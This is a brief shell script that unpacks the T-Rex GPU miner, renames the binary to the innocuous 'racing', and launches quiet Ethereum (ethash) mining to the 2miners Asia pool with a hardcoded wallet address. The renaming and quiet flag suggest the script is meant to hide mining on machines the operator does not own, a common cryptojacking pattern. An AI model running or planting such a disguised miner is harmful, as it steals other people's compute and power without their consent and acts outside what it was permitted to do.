cd /home
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
apt-get update
tar xvzf t-rex-0.21.6-linux.tar.gz
mv t-rex racing
/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x70c2B35C88Df3703cB8c3bfaAfeE9f2E070bA98A -q -p x -w anohito
